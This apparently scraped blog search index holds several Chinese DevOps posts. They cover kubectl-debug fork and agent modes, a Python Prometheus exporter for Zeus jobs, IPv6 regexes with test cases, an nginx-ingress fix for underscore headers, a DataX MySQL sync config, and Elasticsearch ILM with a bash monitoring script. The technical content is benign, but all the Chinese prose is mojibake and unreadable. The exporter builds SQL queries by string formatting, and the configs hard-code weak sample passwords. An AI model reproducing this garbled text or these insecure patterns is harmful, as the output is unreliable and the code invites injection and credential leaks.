·çš„é”™è¯¯ï¼Œéœ€è¦æ‰‹åŠ¨å»å¯¹åº”çš„Nodeä¸Šæ‹‰å–nicolaka/netshoot:latesté•œåƒã€‚æˆ–è€…ä½¿ç”¨å‚æ•°--agent-image=aylei/debug-agent:v0.1.1 è®¿é—®ç›®æ ‡å®¹å™¨çš„æ ¹æ–‡ä»¶ç³»ç»Ÿ: cd /proc/1/root/ 2.fork æ’æŸ¥ CrashLoopBackoff æ˜¯ä¸€ä¸ªå¾ˆéº»çƒ¦çš„é—®é¢˜ï¼ŒPod å¯èƒ½ä¼šä¸æ–­é‡å¯ï¼Œ kubectl exec å’Œ kubectl debug éƒ½æ²¡æ³•ç¨³å®šè¿›è¡Œæ’æŸ¥é—®é¢˜ï¼ŒåŸºæœ¬ä¸Šåªèƒ½å¯„å¸Œæœ›äº Pod çš„æ—¥å¿—ä¸­æ‰“å°å‡ºäº†æœ‰ç”¨çš„ä¿¡æ¯ã€‚ ä¸ºäº†è®©é’ˆå¯¹ CrashLoopBackoff çš„æ’æŸ¥æ›´æ–¹ä¾¿ï¼Œ kubectl-debug å‚è€ƒ oc debug å‘½ä»¤ï¼Œæ·»åŠ äº†ä¸€ä¸ª â€“fork å‚æ•°ã€‚å½“æŒ‡å®š â€“fork æ—¶ï¼Œæ’ä»¶ä¼šå¤åˆ¶å½“å‰çš„ Pod Specï¼Œåšä¸€äº›å°ä¿®æ”¹ï¼Œ å†åˆ›å»ºä¸€ä¸ªæ–° Podï¼š æ–° Pod çš„æ‰€æœ‰ Labels ä¼šè¢«åˆ æ‰ï¼Œé¿å… Service å°†æµé‡å¯¼åˆ° fork å‡ºçš„ Pod ä¸Š æ–° Pod çš„ ReadinessProbe å’Œ LivnessProbe ä¹Ÿä¼šè¢«ç§»é™¤ï¼Œé¿å… kubelet æ€æ­» Pod æ–° Pod ä¸­ç›®æ ‡å®¹å™¨ï¼ˆå¾…æ’éšœçš„å®¹å™¨ï¼‰çš„å¯åŠ¨å‘½ä»¤ä¼šè¢«æ”¹å†™ä¸ºshï¼Œé¿å…æ–° Pod ç»§ç»­ Crash(è¿™éœ€è¦ç›®æ ‡å®¹å™¨åŒ…å«sh,ä¸Šé¢çš„ä¾‹å­ä¸è¡Œ) æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨æ–° Pod ä¸­å°è¯•å¤ç°æ—§ Pod ä¸­å¯¼è‡´ Crash çš„é—®é¢˜ã€‚ä¸ºäº†ä¿è¯æ“ä½œçš„ä¸€è‡´æ€§ï¼Œå¯ä»¥å…ˆ chroot åˆ°ç›®æ ‡å®¹å™¨çš„æ ¹æ–‡ä»¶ç³»ç»Ÿä¸­ kubectl debug demo-pod --fork chroot /proc/1/root ","date":"2022-08-09 15:16","objectID":"/post/2878/:0:2","tags":["k8s"],"title":"kubectl debug - ç¤¾åŒºæ–¹æ¡ˆ","uri":"/post/2878/"},{"categories":["kubernetes"],"content":"ä¸‰ã€å®‰è£…daemonset agent # kubernetesç‰ˆæœ¬å¤§äºç­‰äº1.16 kubectl apply -f https://raw.githubusercontent.com/aylei/kubectl-debug/master/scripts/agent_daemonset.yml # kubernetesç‰ˆæœ¬å°äºv1.16 wget https://raw.githubusercontent.com/aylei/kubectl-debug/master/scripts/agent_daemonset.yml sed -i '' '1s/apps\\/v1/extensions\\/v1beta1/g' agent_daemonset.yml kubectl apply -f agent_daemonset.yml # ä½¿ç”¨agentæ¨¡å¼ kubectl debug --agentless=false POD_NAME æ³¨æ„é˜¿é‡Œäº‘ackä½¿ç”¨çš„cni terwayæ˜¯ä¸æ”¯æŒhostPortçš„ï¼Œæ‰€ä»¥éœ€è¦æ”¹ä¸ºhostNetworkæˆ–è€…ä½¿ç”¨--port-forwardå‚æ•° æœ€å¥½å°†yamlä¸­çš„é•œåƒä¿®æ”¹ä¸ºaylei/debug-agent:v0.1.1 ","date":"2022-08-09 15:16","objectID":"/post/2878/:0:3","tags":["k8s"],"title":"kubectl debug - ç¤¾åŒºæ–¹æ¡ˆ","uri":"/post/2878/"},{"categories":["kubernetes"],"content":"å››ã€é…ç½®æ–‡ä»¶ ~/.kube/debug-config # debug agent listening port(outside container) # default to 10027 agentPort: 10027 # whether using agentless mode # default to true agentless: false # namespace of debug-agent pod, used in agentless mode # default to 'default' agentPodNamespace: default # prefix of debug-agent pod, used in agentless mode # default to 'debug-agent-pod' agentPodNamePrefix: debug-agent-pod # image of debug-agent pod, used in agentless mode # default to 'aylei/debug-agent:latest' agentImage: aylei/debug-agent:v0.1.1 # daemonset name of the debug-agent, used in port-forward # default to 'debug-agent' debugAgentDaemonset: debug-agent # daemonset namespace of the debug-agent, used in port-forwad # default to 'default' debugAgentNamespace: default # whether using port-forward when connecting debug-agent # default true portForward: true # image of the debug container # default as showed image: nicolaka/netshoot:v0.1 # start command of the debug container # default ['bash'] command: - '/bin/bash' - '-l' # private docker registry auth kuberntes secret # default registrySecretName is kubectl-debug-registry-secret # default registrySecretNamespace is default #registrySecretName: my-debug-secret #registrySecretNamespace: debug # in agentless mode, you can set the agent pod's resource limits/requests: # default is not set agentCpuRequests: \"\" agentCpuLimits: \"\" agentMemoryRequests: \"\" agentMemoryLimits: \"\" # in fork mode, if you want the copied pod retains the labels of the original pod, you can change this params # format is []string # If not set, this parameter is empty by default (Means that any labels of the original pod are not retained, and the labels of the copied pods are empty.) forkPodRetainLabels: [] # You can disable SSL certificate check when communicating with image registry by # setting registrySkipTLSVerify to true. registrySkipTLSVerify: false # You can set the log level with the verbosity setting verbosity : 0 ç›®å‰é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œè¿›å…¥çš„shellä¼šå‘ç”Ÿé”™ä¹±, å’Œkubecoloræœ‰å…³ç³»ã€‚ ","date":"2022-08-09 15:16","objectID":"/post/2878/:0:4","tags":["k8s"],"title":"kubectl debug - ç¤¾åŒºæ–¹æ¡ˆ","uri":"/post/2878/"},{"categories":["ç›‘æ§"],"content":"å¤§è‡´æ€è·¯å°±æ˜¯æ¯åˆ†é’Ÿä»mysqlè·å–å½“å¤©ä»»åŠ¡æ‰§è¡Œæƒ…å†µ,æˆåŠŸå’Œå¤±è´¥çš„æŒ‡æ ‡éƒ½ä¼šåŠ 1(Counterç±»å‹)ï¼Œä½¿ç”¨ä¸‹é¢çš„è¡¨åˆ¤æ–­å¦‚æœæ£€æŸ¥è¿‡äº†ï¼Œå°±ä¸å†ç»™æ—¶é—´åºåˆ—çš„æ ·æœ¬åŠ 1ï¼Œæ²¡æ£€æŸ¥è¿‡çš„æ‰ä¼šåŠ 1ã€‚ æ‰€ä»¥æˆ‘ä»¬é€šè¿‡increase(zeus_job_failed_total{}[1h]) \u003e 0è¿™ä¸ªè¡¨è¾¾å¼å°±å¯ä»¥è·å–åˆ°æ˜¯å¦æœ‰ä»»åŠ¡å¤±è´¥äº† CREATE TABLE `zeus_exporter` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `job_id` int(8) NOT NULL DEFAULT '0', `start_time` datetime DEFAULT NULL, `check` int(4) DEFAULT NULL, PRIMARY KEY (`id`) ) DEFAULT CHARSET=utf8 vim zeus_exporter.py import time from datetime import date from prometheus_client import start_http_server, Counter import pymysql c_success = Counter(\"zeus_job_success\", 'zeus job success ststus', [\"job_id\", \"job_name\"]) c_failed = Counter(\"zeus_job_failed\", 'zeus job failed ststus', [\"job_id\", \"job_name\"]) conn = pymysql.Connection(host=\"127.0.0.1\", user=\"zeus\", db=\"zeus\", password=\"zeus\") conn.select_db(\"zeus\") def exec_sql(sql): cursor = conn.cursor() cursor.execute(sql) cursor.close() return cursor.fetchall() def init_counter(): \"\"\"è¿™é‡Œä¸»è¦æ˜¯é˜²æ­¢counteré‡ç½®å¯¼è‡´å‘Šè­¦è¯¯æŠ¥ï¼Œæ‰€ä»¥å¯¹è®¡æ•°è¿›è¡Œäº†æŒä¹…åŒ–\"\"\" sql = \"\"\"select count(res.job_id),res.*, zeus_exporter.check from zeus_exporter join (select zeus_job_history.job_id,zeus_job.name,zeus_job_history.status,zeus_job_history.start_time from zeus_job join zeus_job_history on zeus_job.id = zeus_job_history.job_id )res on zeus_exporter.job_id = res.job_id and date(zeus_exporter.start_time)=date(res.start_time) where zeus_exporter.check=1 group by job_id,status; \"\"\" for row in exec_sql(sql): if row[3] == \"success\": c_success.labels(row[1], row[2]).inc(row[0]) elif row[3] == \"failed\": c_failed.labels(row[1], row[2]).inc(row[0]) def get_history_job(): sql_history = \"\"\"select res.*, zeus_exporter.check from zeus_exporter right join ( select zeus_job_history.job_id,zeus_job.name,zeus_job_history.status,zeus_job_history.start_time from zeus_job right join zeus_job_history on zeus_job.id = zeus_job_history.job_id where date(zeus_job_history.start_time)='%s')res on zeus_exporter.job_id = res.job_id and date(zeus_exporter.start_time)=date(res.start_time); \"\"\" % date.today() return exec_sql(sql_history) def set_metrics(): for row in get_history_job(): if row[4] is None: sql_i = 'insert into zeus_exporter(`job_id`,`start_time`,`check`) values(%s,\"%s\",%s)' % (row[0], row[3], 1) exec_sql(sql_i) if row[2] == \"success\" and row[4] != 1: c_success.labels(row[0], row[1]).inc(1) elif row[2] == \"failed\" and row[4] != 1: c_failed.labels(row[0], row[1]).inc(1) if __name__ == '__main__': start_http_server(8000) init_counter() while True: set_metrics() time.sleep(60) ","date":"2022-08-08 20:48","objectID":"/post/2876/:0:0","tags":["prometheus"],"title":"ä½¿ç”¨prometheusç›‘æ§zeusä»»åŠ¡","uri":"/post/2876/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"ä»logstash groké‡Œæ‰’å‡ºæ¥çš„ https://raw.githubusercontent.com/logstash-plugins/logstash-patterns-core/main/patterns/legacy/grok-patterns ((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:)))(%.+)? å¦‚æœä½ è¦åœ¨netscalerä¸ŠåŒ¹é…ipv6åœ°å€ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„è¿™ä¸ª (?:(?:(?:[0-9A-Fa-f]{1,4}:){7}(?:[0-9A-Fa-f]{1,4}|:))|(?:(?:[0-9A-Fa-f]{1,4}:){6}(?::[0-9A-Fa-f]{1,4}|(?:(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3})|:))|(?:(?:[0-9A-Fa-f]{1,4}:){5}(?:((?::[0-9A-Fa-f]{1,4}){1,2})|:(?:(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3})|:))|(?:(?:[0-9A-Fa-f]{1,4}:){4}(?:((?::[0-9A-Fa-f]{1,4}){1,3})|(?:(:[0-9A-Fa-f]{1,4})?:(?:(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(?:(?:[0-9A-Fa-f]{1,4}:){3}(?:((?::[0-9A-Fa-f]{1,4}){1,4})|(?:(:[0-9A-Fa-f]{1,4}){0,2}:(?:(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(?:(?:[0-9A-Fa-f]{1,4}:){2}(?:((?::[0-9A-Fa-f]{1,4}){1,5})|(?:(:[0-9A-Fa-f]{1,4}){0,3}:(?:(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(?:(?:[0-9A-Fa-f]{1,4}:){1}(?:(?:(?::[0-9A-Fa-f]{1,4}){1,6})|(?:(?::[0-9A-Fa-f]{1,4}){0,4}:(?:(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(?::(?:(?:(?::[0-9A-Fa-f]{1,4}){1,7})|(?:(:[0-9A-Fa-f]{1,4}){0,5}:(?:(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))) æµ‹è¯•ç”¨ä¾‹ # TEST: 1:2:3:4:5:6:7:8 # TEST: 1:: 1:2:3:4:5:6:7:: # TEST: 1::8 1:2:3:4:5:6::8 1:2:3:4:5:6::8 # TEST: 1::7:8 1:2:3:4:5::7:8 1:2:3:4:5::8 # TEST: 1::6:7:8 1:2:3:4::6:7:8 1:2:3:4::8 # TEST: 1::5:6:7:8 1:2:3::5:6:7:8 1:2:3::8 # TEST: 1::4:5:6:7:8 1:2::4:5:6:7:8 1:2::8 # TEST: 1::3:4:5:6:7:8 1::3:4:5:6:7:8 1::8 # TEST: ::2:3:4:5:6:7:8 ::2:3:4:5:6:7:8 ::8 :: # TEST: fe08::7:8%eth0 fe08::7:8%1 # TEST: ::255.255.255.255 ::ffff:255.255.255.255 ::ffff:0:255.255.255.255 # TEST: 2001:db8:3:4::192.0.2.33 64:ff9b::192.0.2.33 # TEST: fe80::7:8%eth0 fe80::7:8%1 # TEST: ::255.255.255.255 ::ffff:255.255.255.255 ::ffff:0:255.255.255.255 # TEST: 2001:db8:3:4::192.0.2.33 64:ff9b::192.0.2.33 å‚è€ƒ https://stackoverflow.com/questions/53497/regular-expression-that-matches-valid-ipv6-addresses https://gist.github.com/syzdek/6086792 ","date":"2022-08-05 19:43","objectID":"/post/2875/:0:0","tags":["ipv6"],"title":"æ­£åˆ™åŒ¹é…ipv6åœ°å€+æµ‹è¯•ç”¨ä¾‹","uri":"/post/2875/"},{"categories":["kubernetes"],"content":"æœ€è¿‘ä»å…¶ä»–åœ°æ–¹è¿ç§»è¿‡æ¥ä¸€ä¸ªæ²¡äººç»´æŠ¤çš„æœåŠ¡,å®¹å™¨åŒ–åè·‘åœ¨k8sä¸Š, éƒ½é…ç½®å®Œåå‘ç°æ— æ³•æ­£å¸¸è®¿é—®,çœ‹æ—¥å¿—è¯´æ²¡è·å–åˆ°token,å¿ƒæƒ³å¯èƒ½æ˜¯nginxä»£ç†è¿™å—ä¸¢å¤±äº†headerä¿¡æ¯ã€‚ ingressé…ç½®å¦‚ä¸‹ apiVersion: extensions/v1beta1 kind: Ingress metadata: annotations: kubernetes.io/ingress.class: nginx nginx.ingress.kubernetes.io/backend-protocol: \"HTTPS\" name: xxxx namespace: arch spec: rules: - host: app.xxx.cn http: paths: - backend: serviceName: xxx-service servicePort: 443 path: / è¯å®ä¸€ä¸‹,è·³è¿‡ingressç›´æ¥é€šè¿‡è®¿é—®podå’Œsvcè®¿é—® k -n arch port-forward --address 0.0.0.0 xxx-service-575cc8dc76-sftz9 443:443 k -n arch port-forward --address 0.0.0.0 service/xxx-service 443:443 æµ‹è¯•å®Œå‘ç°éƒ½æ˜¯æ²¡é—®é¢˜çš„ã€‚ æœ€ç»ˆåŸå› å°±æ˜¯è¯·æ±‚å¤´é‡ŒåŒ…å«äº†ä¸‹åˆ’çº¿ï¼Œnginxé»˜è®¤æ˜¯ä¼šå¿½ç•¥ä¸‹åˆ’çº¿çš„ï¼Œæ‰€ä»¥å¯¼è‡´åç«¯è¯»å–headerä¼šæ‰¾ä¸åˆ°ã€‚ è§£å†³æ–¹å¼æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯å…¨å±€å¼€å¯è¯†åˆ«ä¸‹åˆ’çº¿ï¼Œä¸€ä¸ªæ˜¯æŒ‡å®šçš„ingressç”¨æ³¨è§£å¼€å¯ã€‚ å…¨å±€å¼€å¯ k edit cm -n kube-system nginx-configuration # å¢åŠ å¦‚ä¸‹å†…å®¹ enable-underscores-in-headers: enabled éœ€è¦é‡å¯ingress-controller ä½¿ç”¨æ³¨è§£ annotations: kubernetes.io/ingress.class: nginx nginx.ingress.kubernetes.io/server-snippet: | underscores_in_headers on; ","date":"2022-07-29 14:17","objectID":"/post/2868/:0:0","tags":["k8s"],"title":"nginx-ingressä¸¢å¤±headeré—®é¢˜","uri":"/post/2868/"},{"categories":["å…¶ä»–"],"content":"å¤‡å¿˜ # å°†è·¯ç”±ä¿¡æ¯æ¨é€åˆ°å®¢æˆ·ç«¯ push \"route 172.30.0.0 255.255.254.0\" # æ³¨é‡Šæ‰ä¸‹é¢è¿™è¡Œ # push \"redirect-gateway def1 bypass-dhcp\" ","date":"2022-07-25 13:49","objectID":"/post/2865/:0:0","tags":[],"title":"openvpnä»…è·¯ç”±å†…ç½‘","uri":"/post/2865/"},{"categories":["kubernetes"],"content":"å¤‡å¿˜ k run python3-test -it --rm=true --restart=Never --image python:3.7-alpine3.16 -- sh ","date":"2022-07-20 17:52","objectID":"/post/2864/:0:0","tags":["k8s"],"title":"kubectlåˆ›å»ºpod","uri":"/post/2864/"},{"categories":["databases"],"content":"dataxæ˜¯æ’ä»¶æœºåˆ¶çš„,ä¸€èˆ¬æ’ä»¶æ”¯æŒè¯»å†™ï¼Œæ¯”å¦‚mysqlï¼ŒæŸäº›æ’ä»¶æ”¯æŒåªå†™æ¯”å¦‚esçš„ã€‚ æ’ä»¶æ–‡æ¡£: https://github.com/alibaba/DataX#support-data-channels mysql -\u003e mysqlç¤ºä¾‹ { \"core\": { \"transport\": { \"channel\": { \"speed\": { \"byte\": 10485760 } } } }, \"job\": { \"setting\": { \"speed\": { \"channel\": 10 } }, \"content\": [ { \"reader\": { \"name\": \"mysqlreader\", \"parameter\": { \"username\": \"root\", \"password\": \"123456\", \"column\": [\"uid\"], # è¦åŒæ­¥å“ªä¸€åˆ— \"splitPk\": \"id\", # ä¸»é”®å­—æ®µ,å•é€šé“åŒæ­¥å¯ä»¥ä¸è®¾ç½® \"connection\": [ # è¦åŒæ­¥çš„è¡¨å’Œåº“çš„ä¿¡æ¯ { \"table\": [\"user\"], \"jdbcUrl\": [\"jdbc:mysql://xxx:3306/xxx\"] } ] } }, \"writer\": { \"name\": \"mysqlwriter\", \"parameter\": { \"writeMode\": \"insert\", \"username\": \"chaoge_log\", \"password\": \"SimpleLog\", \"column\": [\"newuid\"], # ç›®æ ‡è¡¨ä¸­çš„å­—æ®µå \"connection\": [ # ç›®æ ‡è¡¨å’Œåº“çš„ä¿¡æ¯ { \"jdbcUrl\": \"jdbc:mysql://xxx:3306/xxx\", \"table\": [\"user\"] } ] } } } ] } } å¼€å§‹ python ./bin/datax.py conf/xxx.json ","date":"2022-07-15 14:47","objectID":"/post/2862/:0:0","tags":["mysql","datax"],"title":"dataxæŠ½æ•°","uri":"/post/2862/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"æ“ä½œæ­¥éª¤ å®æˆ˜ä¸ºä¸»,æ²¡æœ‰è®²ç›¸å…³æ¦‚å¿µ åˆ›å»ºpolicyï¼Œå®šä¹‰ä¸åŒé˜¶æ®µå¯¹åº”çš„ä¸åŒåŠ¨ä½œ åˆ›å»ºç´¢å¼•æ¨¡æ¿å¹¶å’Œç”Ÿå‘½å‘¨æœŸç­–ç•¥ç»‘å®š åˆ›å»ºç´¢å¼• æµ‹è¯•ILMæ‰§è¡Œ ","date":"2022-07-07 21:28","objectID":"/post/2858/:0:1","tags":["elasticsearch"],"title":"ElasticSearch ILMç´¢å¼•ç”Ÿå‘½å‘¨æœŸå®è·µ - æ—¥å¿—åœºæ™¯","uri":"/post/2858/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸€ã€åˆ›å»ºpolicy è¿™é‡Œæ ¹æ®æ—¥å¿—çš„åœºæ™¯æ¥åšé…ç½®,ä¸€èˆ¬åªè€ƒè™‘ä¸‰ä¸ªé˜¶æ®µçƒ­ã€æš–æˆ–å†·ã€åˆ é™¤ï¼Œä¸‹é¢ç”¨äº†warmæ²¡æœ‰ç”¨cold PUT _ilm/policy/test-logs { \"policy\": { \"phases\": { \"hot\": { \"min_age\" : \"0m\", \"actions\": { \"set_priority\": { \"priority\": 100 } } }, \"warm\": { \"min_age\": \"1m\", \"actions\": { \"set_priority\" : { \"priority\": 50 }, \"allocate\" : { \"number_of_replicas\": 0, \"require\" : { \"box_type\": \"warm\" } }, \"forcemerge\" : { \"max_num_segments\": 1, \"index_codec\": \"best_compression\" } } }, \"delete\": { \"min_age\": \"2m\", \"actions\": { \"delete\": {} } } } } } å¯¹äºmin_ageå‚æ•°çš„ç†è§£: è®¾ç½®ä¸º1mçš„æ—¶å€™ä»£è¡¨ç´¢å¼•è¢«åˆ›å»ºè‡³å°‘1mæ‰ä¼šè¿›å…¥å½“å‰é˜¶æ®µæ‰§è¡Œåç»­åŠ¨ä½œ,å¦åˆ™è¿˜ä¼šå¤„äºä¸Šä¸€ä¸ªé˜¶æ®µã€‚ hot: ç´¢å¼•è¢«åˆ›å»ºåç«‹åˆ»è¿›å…¥çƒ­é˜¶æ®µ(å› ä¸ºmin_age=0ms)ï¼Œè¿›å…¥åæ‰§è¡Œactionï¼Œè®¾ç½®ç´¢å¼•ä¼˜å…ˆçº§ä¸º100ã€‚ warm: è¿›å…¥warmé˜¶æ®µéœ€è¦ç´¢å¼•çš„min_age=1mï¼Œæ»¡è¶³åæ‰§è¡ŒåŠ¨ä½œï¼Œè®¾ç½®ç´¢å¼•ä¼˜å…ˆçº§ä¸º50ï¼Œè®¾ç½®å‰¯æœ¬ä¸º0,ç´¢å¼•åˆ†é…ç»™warmèŠ‚ç‚¹(éœ€è¦è‡ªè¡Œè®¾ç½®node.attr.box_type),æ‰§è¡ŒForceMergeæ“ä½œå°†segmentåˆå¹¶ä¸º1ä¸ªï¼Œå¹¶ä¸”ä½¿ç”¨best_compressionå‹ç¼©æ•°æ®ï¼Œè¿™ä¸ªæ¯”é»˜è®¤çš„LZ4å‹ç¼©æ¯”æ›´é«˜,ä½†æœç´¢æ€§èƒ½å·® delete: ç­‰å¾…ç´¢å¼•åˆ›å»ºè‡³ä»Šæ»¡è¶³2m(min_age=2m)åï¼Œè¿›å…¥deleteé˜¶æ®µï¼Œæ‰§è¡Œåˆ é™¤ç´¢å¼•æ“ä½œ ","date":"2022-07-07 21:28","objectID":"/post/2858/:0:2","tags":["elasticsearch"],"title":"ElasticSearch ILMç´¢å¼•ç”Ÿå‘½å‘¨æœŸå®è·µ - æ—¥å¿—åœºæ™¯","uri":"/post/2858/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"äºŒã€åˆ›å»ºç´¢å¼•æ¨¡æ¿ ä¸‹é¢ä»…ç”¨äºæµ‹è¯•ï¼Œç”Ÿäº§å»ºè®®æ ¹æ®è‡ªå·±å®é™…æƒ…å†µä¿®æ”¹ PUT _index_template/test-log { \"index_patterns\": [ \"test-log-*\" ], \"template\": { \"settings\": { \"index\": { \"routing.allocation.require.box_type\": \"hot\", \"lifecycle\": { \"name\": \"test-logs\" }, \"number_of_shards\": \"5\", \"number_of_replicas\": \"1\" } } } } ","date":"2022-07-07 21:28","objectID":"/post/2858/:0:3","tags":["elasticsearch"],"title":"ElasticSearch ILMç´¢å¼•ç”Ÿå‘½å‘¨æœŸå®è·µ - æ—¥å¿—åœºæ™¯","uri":"/post/2858/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸‰ã€åˆ›å»ºç´¢å¼• åˆ›å»ºå‰å¯ä»¥å…ˆå‡†å¤‡ä¸€ä¸‹æµ‹è¯•è„šæœ¬,æ–¹ä¾¿æŸ¥çœ‹ç»“æœ PUT %3Ctest-log-%7Bnow%2Fd%7D%3E ","date":"2022-07-07 21:28","objectID":"/post/2858/:0:4","tags":["elasticsearch"],"title":"ElasticSearch ILMç´¢å¼•ç”Ÿå‘½å‘¨æœŸå®è·µ - æ—¥å¿—åœºæ™¯","uri":"/post/2858/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"å››ã€æµ‹è¯• å®˜æ–¹çš„API GET test-log-*/_ilm/explain ä¸´æ—¶å†™äº†ä¸ªè„šæœ¬ç”¨æ¥æµ‹è¯•æ‰§è¡Œæ˜¯å¦ç¬¦åˆé¢„æœŸ,è¦ä½¿ç”¨çš„è¯éœ€è¦ä¿®æ”¹ç”¨æˆ·åå¯†ç ï¼Œesåœ°å€ grep -Ev 'es-0[1-3]'æ˜¯è¿‡æ»¤æˆ‘çš„hotèŠ‚ç‚¹ï¼Œæ”¹æˆè¿‡æ»¤ä½ çš„hotèŠ‚ç‚¹å³å¯ #!/bin/bash index_name=\"${1:-default}\" index_exits(){ code=$(curl -s -o /dev/null -w %{http_code} -u elastic:xxx 10.10.101.226:9200/$index_name) [[ $code == 404 ]] \u0026\u0026 return 1 || return 0 } watch_hot(){ create_time=$(curl -s -u elastic:xxx \"10.10.101.226:9200/$index_name/_settings\" | jq -r \".\\\"$index_name\\\".settings.index.creation_date\" | sed 's#...$##') echo \"$(date -d \"@$create_time\" '+%F %H:%M:%S') \u003e\u003e ç´¢å¼•è¢«åˆ›å»º\" } watch_warm(){ while true; do curl -s -u elastic:xxx 10.10.101.226:9200/_cat/shards/$index_name | awk '$3==\"p\"{print $NF}' | grep -Ev 'es-0[1-3]' \u0026\u003e /dev/null if [[ $? -eq 0 ]] then echo \"$(date '+%F %H:%M:%S') \u003e\u003e åˆ†ç‰‡è¢«åˆ†é…åˆ°warmèŠ‚ç‚¹\" break fi sleep 1 done } watch_delete(){ while true; do index_exits if [[ $? -eq 1 ]] then echo \"$(date '+%F %H:%M:%S') \u003e\u003e ç´¢å¼•è¢«åˆ é™¤\" break fi sleep 1 done } index_exits if [[ $? -eq 0 ]] then watch_hot watch_warm watch_delete else echo \"ç´¢å¼•ä¸å­˜åœ¨\" fi æ‰§è¡Œè„šæœ¬ sh es_ilm_watch.sh test-log-2022.07.07 æœ€ç»ˆæ•ˆæœ 93929-dwce4zz01ur.png ","date":"2022-07-07 21:28","objectID":"/post/2858/:0:5","tags":["elasticsearch"],"title":"ElasticSearch ILMç´¢å¼•ç”Ÿå‘½å‘¨æœŸå®è·µ - æ—¥å¿—åœºæ™¯","uri":"/post/2858/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"PS: å¯èƒ½ä½ æµ‹è¯•ä¸‹æ¥ä¼šå‘ç°å¹¶ä¸ç¬¦åˆé¢„æœŸ,å› ä¸ºæˆ‘ä¹Ÿç¢°åˆ°äº†ã€‚ æ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´çš„å‘¢ï¼Ÿè¿™é‡Œéœ€è¦ä¿®æ”¹ä¸€ä¸ªå‚æ•°indices.lifecycle.poll_intervalï¼Œè¿™æ˜¯ä¸€ä¸ªé›†ç¾¤çº§åˆ«çš„é…ç½®ï¼Œç”¨æ¥æ§åˆ¶ILMå¤šä¹…æ£€æŸ¥ä¸€æ¬¡ç´¢å¼•æ˜¯å¦ç¬¦åˆILMç­–ç•¥çš„é¢‘ç‡ï¼Œé»˜è®¤æ˜¯10mã€‚ ä¸€èˆ¬æƒ…å†µä¸éœ€è¦ä¿®æ”¹è¿™ä¸ªå‚æ•°ï¼Œä½†æ˜¯æˆ‘ä¸Šé¢è®¾ç½®çš„å‚æ•°è¿œå°äº10mï¼Œæ‰€ä»¥è¦æƒ³æµ‹è¯•æˆåŠŸï¼Œè¿˜éœ€è¦æ‰‹åŠ¨å°†æ£€æŸ¥é—´éš”æ”¹ä¸º1sæ¥æµ‹è¯• PUT /_cluster/settings { \"transient\" : { \"indices.lifecycle.poll_interval\" : \"1s\" } } æµ‹è¯•æ²¡é—®é¢˜å°±å¯ä»¥å…³æ‰äº† PUT 